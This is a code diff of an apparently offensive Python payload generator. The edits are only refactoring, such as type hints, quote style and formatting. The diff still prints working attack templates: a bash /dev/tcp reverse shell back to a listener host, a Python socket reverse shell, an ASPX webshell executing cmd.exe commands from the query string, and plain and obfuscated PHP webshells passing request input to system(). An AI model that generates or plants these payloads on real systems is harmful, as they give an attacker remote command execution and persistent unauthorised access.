@@ -5,9 +5,8 @@ Generates shellcode, reverse shells, webshells, and bind shells
 in multiple languages with optional encoding/obfuscation.
 """
 
-from dataclasses import dataclass, field
+from dataclasses import dataclass
 from enum import Enum
-from typing import Dict, List, Optional
 
 
 class PayloadLanguage(Enum):
@@ -39,7 +38,7 @@ class GeneratedPayload:
     lport: int = 0
     rport: int = 0
 
-    def to_dict(self) -> Dict:
+    def to_dict(self) -> dict:
         return {
             "type": self.payload_type.value,
             "language": self.language.value,
@@ -51,9 +50,9 @@ class GeneratedPayload:
         }
 
 
-SHELL_TEMPLATES: Dict[str, Dict[str, str]] = {
+SHELL_TEMPLATES: dict[str, dict[str, str]] = {
     "reverse_shell": {
-        "bash": 'bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1',
+        "bash": "bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1",
         "python": (
             "import socket,subprocess,os\n"
             "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n"
@@ -125,22 +124,22 @@ SHELL_TEMPLATES: Dict[str, Dict[str, str]] = {
             '  string cmd = Request.QueryString["cmd"];\n'
             "  if (!string.IsNullOrEmpty(cmd)) {{\n"
             "    Process p = new Process();\n"
-            "    p.StartInfo.FileName = \"cmd.exe\";\n"
-            '    p.StartInfo.Arguments = "/c \" + cmd;\n'
+            '    p.StartInfo.FileName = "cmd.exe";\n'
+            '    p.StartInfo.Arguments = "/c " + cmd;\n'
             "    p.StartInfo.UseShellExecute = false;\n"
             "    p.StartInfo.RedirectStandardOutput = true;\n"
             "    p.Start();\n"
             "    Response.Write(p.StandardOutput.ReadToEnd());\n"
             "  }}\n"
             "}}\n"
-            '</script>'
+            "</script>"
         ),
         "php_simple": '<?=`$_GET["cmd"]`;?>',
         "php_obfuscated": (
             "<?php\n"
-            "$_ = \"Y29kZQ==\";\n"
-            "$__ = \"cmd\";\n"
-            "$___ = \"system\";\n"
+            '$_ = "Y29kZQ==";\n'
+            '$__ = "cmd";\n'
+            '$___ = "system";\n'
             "$____ = $_POST[$__];\n"
             "$___($____);\n"
             "?>"
@@ -199,7 +198,11 @@ class PayloadGenerator:
             template = SHELL_TEMPLATES.get(type_key, {}).get(fallback, "")
             language = PayloadLanguage(fallback)
 
-        code = template.replace("{LHOST}", lhost).replace("{LPORT}", str(lport)).replace("{RPORT}", str(rport))
+        code = (
+            template.replace("{LHOST}", lhost)
+            .replace("{LPORT}", str(lport))
+            .replace("{RPORT}", str(rport))
+        )
 
         desc_map = {
             PayloadType.REVERSE_SHELL: f"Reverse shell to {lhost}:{lport}",
@@ -218,8 +221,8 @@ class PayloadGenerator:
             rport=rport,
         )
 
-    def generate_chain(self, lhost: str = "127.0.0.1", lport: int = 4444) -> List[GeneratedPayload]:
-        payloads: List[GeneratedPayload] = []
+    def generate_chain(self, lhost: str = "127.0.0.1", lport: int = 4444) -> list[GeneratedPayload]:
+        payloads: list[GeneratedPayload] = []
 
         for lang in PayloadLanguage:
             if lang == PayloadLanguage.ASPX:
@@ -232,8 +235,8 @@ class PayloadGenerator:
 
         return payloads
 
-    def list_available(self) -> Dict[str, List[str]]:
-        result: Dict[str, List[str]] = {}
+    def list_available(self) -> dict[str, list[str]]:
+        result: dict[str, list[str]] = {}
         for ptype in PayloadType:
             key = ptype.value
             templates = SHELL_TEMPLATES.get(key, {})
